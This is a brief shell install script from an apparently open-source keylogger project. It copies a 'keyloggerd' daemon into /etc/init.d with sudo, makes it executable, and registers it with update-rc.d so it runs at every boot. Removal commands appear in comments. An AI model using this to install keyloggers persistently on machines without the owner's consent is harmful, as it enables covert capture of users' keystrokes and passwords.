#! /bin/sh

#################################################
# Author    : Sunil bn
# copyright : Copyleft 2015, keylogger Project
# license   : GPL 3.0
# version   : 0.0.0
# email     : sunhick@gmail.com
#################################################

# copy the daemon script to /etc/init.d/
sudo cp ./init.d/keyloggerd /etc/init.d/

# make it a executable
chmod 755 /etc/init.d/keyloggerd

# Add the appropriate symbolic links to cause the 
# script to be executed when the system goes down, 
# or comes up. 
update-rc.d keyloggerd defaults

# To remove the script from the startup sequence in the future run: 
# update-rc.d -f keyloggerd remove

# Make sure that the entry is added in rc.d
# ls -l /etc/rc?.d/*keyloggerd
